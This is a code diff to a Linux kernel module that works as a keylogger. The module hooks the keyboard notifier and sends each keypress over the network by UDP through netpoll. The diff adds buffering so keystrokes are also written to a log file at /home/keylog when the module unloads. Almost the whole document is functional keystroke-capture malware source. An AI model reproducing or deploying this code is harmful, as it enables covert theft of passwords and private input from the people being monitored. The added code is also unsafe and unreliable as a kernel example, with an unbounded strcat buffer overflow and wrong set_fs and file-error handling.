@@ -4,9 +4,20 @@
 #include <linux/keyboard.h>
 #include <linux/notifier.h>
 #include <linux/netpoll.h>
+#include <linux/notifier.h>
+#include <linux/syscalls.h> 
+#include <linux/file.h> 
+#include <linux/fcntl.h>  
+#include <linux/mm.h>
+#include<linux/types.h>
+#include<linux/fs.h>
+#include<linux/string.h>
+#include<asm/uaccess.h>
 
 #define KEY_PRESSED 1
 #define KEY_NOT_PRESSED 0
+#define MAX_BUFFER 9999
+#define LOG_DIR "/home/keylog"
 
 MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
 MODULE_LICENSE("GPL");
@@ -26,12 +37,15 @@ static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8
 
 static struct notifier_block nb;
 static struct netpoll np;
+char buffer[MAX_BUFFER] = "\nKEYLOG\n--------------------------\n"; //TODO add timestamp
+static struct file *outfile = NULL;
 
 /*
 	keyboard_notifier_callback
 	must be of the type notifier_fn_t(notifier_block *nb,
-									  unsigned long action, void *data)
+					  unsigned long action, void *data)
 */
+
 int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
 	struct keyboard_notifier_param *kb = data;
 
@@ -41,10 +55,9 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
 	*/
 	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
 		char message[16];
-		
 		strcpy(message, keys[kb->value]);
+		strcat(buffer, message);
 		//message[strlen(keys[kb->value])] = '\0';
-
 		printk(KERN_DEBUG "Sending message: %s\n", message);
 		message[0] = keys[kb->value][0];
 		netpoll_send_udp(&np, message, strlen(message));
@@ -71,7 +84,29 @@ static int __init init_keylogger(void){
 	return 0;
 }
 
+/*
+	Found the filp functions here
+	http://lxr.free-electrons.com/source/fs/open.c#L1072
+	
+	Flags for filp
+	http://pubs.opengroup.org/onlinepubs/7908799/xsh/open.html
+	
+	set_fs()
+	http://lxr.free-electrons.com/source/arch/blackfin/include/asm/uaccess.h#L25
+*/
+
 static void __exit exit_keylogger(void){
+	mm_segment_t prevfs;
+	outfile = filp_open(LOG_DIR, O_RDWR | O_APPEND, 0);
+	if(!outfile)
+	  printk(KERN_ALERT "Error opening file\n");
+	prevfs = USER_DS;
+	set_fs(KERNEL_DS);
+	strcat(buffer, "\n--------------------------\n");
+	outfile->f_op->write(outfile, buffer, strlen(buffer), &outfile->f_pos);
+	set_fs(prevfs);
+	if(outfile)
+	  filp_close(outfile, NULL);
 	unregister_keyboard_notifier(&nb);
 }
 
